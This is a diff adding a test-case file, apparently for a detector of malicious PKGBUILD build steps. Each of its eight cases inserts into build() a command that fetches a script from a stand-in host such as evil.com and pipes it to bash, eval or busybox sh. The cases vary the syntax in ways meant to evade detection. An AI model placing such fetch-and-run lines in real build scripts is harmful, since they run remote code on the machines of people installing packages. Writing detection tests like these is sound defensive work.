@@ -1,0 +1,50 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        make
+        http https://evil.com/stage.sh | eval
+  id: 01-http-eval
+- vars:
+    payload: |
+      build() {
+        make
+        http https://github.com/evil/x.sh | eval
+  id: 02-http-eval-gh
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh curl $U | bash
+  id: 03-same-line-assign
+- vars:
+    payload: |
+      build() {
+        make
+        U="evil.com/stage.sh" curl "$U" | bash
+  id: 04-same-line-assign-quoted
+- vars:
+    payload: |
+      build() {
+        make
+        export EVIL_URL=evil.com/stage.sh; curl $EVIL_URL | bash
+  id: 05-export-scheme-less
+- vars:
+    payload: |
+      build() {
+        make
+        P=https; U=evil.com/stage.sh; curl "$P://$U" | bash
+  id: 06-split-scheme
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh wget -qO- $U | bash
+  id: 07-wget-scheme-less
+- vars:
+    payload: |
+      build() {
+        make
+        http https://evil.com/stage.sh | busybox sh
+  id: 08-http-busybox
